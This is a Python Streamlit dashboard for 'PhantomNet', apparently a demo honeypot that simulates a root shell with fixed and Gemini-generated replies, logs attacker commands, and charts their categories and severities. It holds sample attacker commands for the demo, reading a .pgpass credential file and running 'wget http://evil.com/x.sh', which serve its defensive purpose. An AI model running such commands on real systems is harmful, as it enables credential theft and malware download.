import os
import time
import requests
import pandas as pd
import streamlit as st
from dotenv import load_dotenv

load_dotenv()

API_URL = "http://127.0.0.1:5000"
HOSTNAME = "prod-db-01"
BANNER = f"Ubuntu 22.04.3 LTS {HOSTNAME} tty1"
START_PROMPT = f"root@{HOSTNAME}:~# "

st.set_page_config(page_title="PhantomNet Dashboard", layout="wide")
st.title("PhantomNet: Attacker Activity Dashboard")

ss = st.session_state

# Presenter mode is OFF by default. It is switched on by opening the page with
# ?presenter=1 in the address, or by PHANTOMNET_PRESENTER=1 in your local .env file.
PRESENTER = (
    os.getenv("PHANTOMNET_PRESENTER", "0") == "1"
    or st.query_params.get("presenter") == "1"
)


def reset_terminal():
    ss.term_lines = [BANNER, ""]
    ss.term_sid = None
    ss.term_prompt = START_PROMPT
    ss.last_info = ""
    ss.summary_text = ""
    ss.last_session = None
    ss.demo_step = 0


def api_get(path, params=None):
    r = requests.get(f"{API_URL}{path}", params=params, timeout=5)
    r.raise_for_status()
    return r.json()


def format_summary(s):
    cats = ", ".join(f"{k}={v}" for k, v in sorted(s["categories"].items()))
    lines = [
        f"Session          : {s['session_id']}",
        f"Commands         : {s['commands']} in {s['duration_seconds']} sec",
        f"Highest severity : {s['highest_severity']}",
        f"Categories       : {cats}",
        f"Lure files read  : {', '.join(s['lure_files_touched']) or 'none'}",
    ]
    if s["high_critical_commands"]:
        lines.append("High/critical commands:")
        lines += [f"  - {c}" for c in s["high_critical_commands"]]
    return "\n".join(lines)


EXPLAIN = {
    "whoami": "The attacker asks which user they are. Python answered instantly with a fixed reply. Logged as recon (low risk).",
    "ls": "The attacker lists the files. Python showed the fake bait files. Logged as recon (low risk).",
    "cat .pgpass": "The attacker reads a password file. The credentials in it are fake bait. Logged as credential_access (medium risk).",
    "exit": "The session ended. The admin now gets a summary of everything the attacker did.",
}
SOURCE_TEXT = {
    "python": "Python (fixed answer)",
    "llm": "Gemini AI (generated answer)",
    "llm-error": "a fallback message (the AI was busy)",
}


def explain(command, j):
    key = " ".join(command.split())
    if key.startswith("wget "):
        return ("The attacker tries to download a malicious script. The fake server has no internet, "
                "so it fails like a real one. Logged as malware_download (high risk), so an alert is raised.")
    if key in EXPLAIN:
        return EXPLAIN[key]
    return (f"Answered by {SOURCE_TEXT.get(j['source'], j['source'])}. "
            f"Logged as {j['category']} (severity: {j['severity']}).")


def run_command(command):
    ss.term_lines.append(ss.term_prompt + command)
    body = {"command": command}
    if ss.term_sid:
        body["session_id"] = ss.term_sid
    try:
        with st.spinner("The honeypot is answering..."):
            resp = requests.post(f"{API_URL}/api/command", json=body, timeout=180)
        if resp.status_code == 200:
            j = resp.json()
            ss.term_sid = j["session_id"]
            ss.last_session = j["session_id"]
            if j["output"]:
                ss.term_lines.append(j["output"])
            ss.term_prompt = j["prompt"]
            ss.last_info = explain(command, j)
            if command.split()[0] in ("exit", "logout"):
                try:
                    ss.summary_text = format_summary(api_get(f"/api/summary/{ss.term_sid}"))
                except requests.RequestException:
                    ss.summary_text = ""
                ss.term_sid = None
                ss.term_prompt = START_PROMPT
                ss.term_lines.append("")
        else:
            try:
                msg = resp.json().get("error", resp.text)
            except ValueError:
                msg = resp.text
            ss.term_lines.append(f"[API error {resp.status_code}: {msg}]")
    except requests.RequestException:
        ss.term_lines.append("[Could not reach the API. Is api.py running?]")


if "term_lines" not in ss:
    reset_terminal()

# ---------------------------------------------------------------- terminal
st.subheader("Live attacker terminal")
st.caption("Type commands like an attacker would. The honeypot answers here, "
           "and the alerts and charts below update.")
term_box = st.empty()

with st.form("terminal_form", clear_on_submit=True):
    col_in, col_btn = st.columns([6, 1])
    cmd = col_in.text_input(
        "Command",
        placeholder="e.g. whoami, cat .pgpass, wget http://evil.com/x.sh",
        label_visibility="collapsed",
    )
    run = col_btn.form_submit_button("Run", key="run_btn")

if st.button("Start new session", key="new_session_btn"):
    reset_terminal()

SHORTCUTS = [
    ("1. whoami", "whoami"),
    ("2. ls", "ls"),
    ("3. cat .pgpass", "cat .pgpass"),
    ("4. wget evil.com/x.sh", "wget http://evil.com/x.sh"),
    ("5. exit", "exit"),
]
clicked = None
note_box = None
if PRESENTER:
    with st.sidebar.expander("Presenter panel (this laptop only)", expanded=False):
        step = ss.demo_step
        for n, (label, _) in enumerate(SHORTCUTS):
            name = label.split(". ", 1)[1]
            if n < step:
                st.caption(f"done  {n + 1}. {name}")
            elif n == step:
                st.markdown(f"**next  {n + 1}. {name}**")
            else:
                st.caption(f"      {n + 1}. {name}")
        if step < len(SHORTCUTS):
            if st.button(f"Run next step ({step + 1} of {len(SHORTCUTS)})", key="demo_next"):
                clicked = SHORTCUTS[step][1]
        else:
            st.success("Demo finished.")
        if st.button("Restart demo steps", key="demo_restart"):
            ss.demo_step = 0
            st.rerun()
        note_box = st.empty()

if clicked:
    ss.demo_step += 1
    run_command(clicked)
    st.rerun()
elif run and cmd.strip():
    run_command(cmd.strip())

term_box.code("\n".join(ss.term_lines[-45:]) + "\n" + ss.term_prompt, language="bash")
if PRESENTER and note_box is not None and ss.last_info:
    note_box.info("What just happened: " + ss.last_info)
if ss.summary_text:
    st.markdown("**Session summary (admin only)**")
    st.code(ss.summary_text, language="text")

st.divider()

# ---------------------------------------------------------------- dashboard
col_a, col_b = st.columns([1, 5])
col_a.button("Refresh", key="refresh_btn")
auto = col_b.checkbox("Auto-refresh (5 sec)")

try:
    stats = api_get("/api/stats")
    logs = api_get("/api/logs", {"limit": 1000})
except requests.RequestException:
    st.error(
        "Could not connect to the API. Start it in a new terminal with "
        "`python api.py`, then click Refresh."
    )
    st.stop()

if not logs:
    st.info("No logs yet. Send a command in the terminal above.")
    st.stop()

df = pd.DataFrame(logs)
df["timestamp"] = pd.to_datetime(df["timestamp"], utc=True)
try:
    df["time"] = df["timestamp"].dt.tz_convert("Asia/Kolkata")
except Exception:
    df["time"] = df["timestamp"]

options = ["All"] + sorted(df["session_id"].unique().tolist())
current = ss.get("term_sid") or ss.get("last_session")
default_index = options.index(current) if current in options else 0
choice = st.sidebar.selectbox("Session", options, index=default_index)
if choice != "All":
    df = df[df["session_id"] == choice]

alerts = df[df["severity"].isin(["high", "critical"])]

if choice == "All":
    total, n_sessions, n_alerts = (
        stats["total_commands"],
        stats["sessions"],
        stats["high_critical_alerts"],
    )
else:
    total, n_sessions, n_alerts = len(df), 1, len(alerts)

c1, c2, c3, c4, c5 = st.columns(5)
c1.metric("Total commands", total)
c2.metric("Sessions", n_sessions)
c3.metric("High/Critical alerts", n_alerts)
c4.metric("LLM responses", int((df["source"] == "llm").sum()))
c5.metric("LLM errors", int((df["source"] == "llm-error").sum()))

left, right = st.columns(2)
with left:
    st.subheader("Attack categories")
    st.bar_chart(df["category"].value_counts())
with right:
    st.subheader("Severity")
    st.bar_chart(df["severity"].value_counts())

st.subheader("Attack timeline (commands per minute)")
tl = df.copy()
tl["minute"] = tl["time"].dt.floor("min").dt.tz_localize(None)
timeline = tl.groupby(["minute", "category"]).size().unstack(fill_value=0)
timeline.index = timeline.index.strftime("%H:%M")
st.bar_chart(timeline)

st.subheader("Alerts (high / critical)")
if alerts.empty:
    st.success("No high/critical alerts yet.")
else:
    st.dataframe(
        alerts.sort_values("id", ascending=False)[
            ["time", "session_id", "command", "category", "severity"]
        ],
    )

st.subheader("Live terminal view (selected session)")
view = df.sort_values("id")
if choice == "All":
    view = view.tail(20)
lines = []
for _, row in view.iterrows():
    shown = "~" if row["cwd"] == "/root" else row["cwd"]
    lines.append(f"root@{HOSTNAME}:{shown}# {row['command']}")
    if row["response"]:
        lines.append(row["response"])
st.code("\n".join(lines), language="bash")

st.subheader("Command history")
st.dataframe(
    df.sort_values("id", ascending=False)[
        ["time", "session_id", "cwd", "command", "category", "severity", "response", "source"]
    ],
)

if auto:
    time.sleep(5)
    st.rerun()